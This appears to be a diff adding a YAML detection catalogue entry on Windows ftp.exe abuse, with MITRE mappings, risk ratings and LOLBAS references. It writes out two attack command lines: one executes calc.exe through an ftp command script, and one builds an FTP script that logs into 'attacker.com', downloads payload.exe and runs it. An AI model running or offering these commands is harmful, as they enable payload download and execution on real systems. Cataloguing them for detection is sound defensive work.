@@ -1,0 +1,42 @@
+- command: echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
+  description: Executes commands stored in ftpcommands.txt.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/
+    - https://twitter.com/0xAmit/status/1070063130636640256
+  risk: High
+  risk_reason: This is an immediate indicator of suspicious activity.
+  fidelity: High
+  fidelity_reason: The use of ftp in general and when combined with this manner of activity, is extremely abnormal for most organizations.
+  tool: ftp
+  threatactors:
+    N/A:
+      - N/A
+- command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
+  description: Connect to a remote FTP server, download a payload and then execute it with cmd.exe.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/
+    - https://twitter.com/0xAmit/status/1070063130636640256
+  risk: High
+  risk_reason: This is an immediate indicator of suspicious activity.
+  fidelity: High
+  fidelity_reason: The use of ftp in general and when combined with this manner of activity, is extremely abnormal for most organizations.
+  tool: ftp
+  threatactors:
+    N/A:
+      - N/A
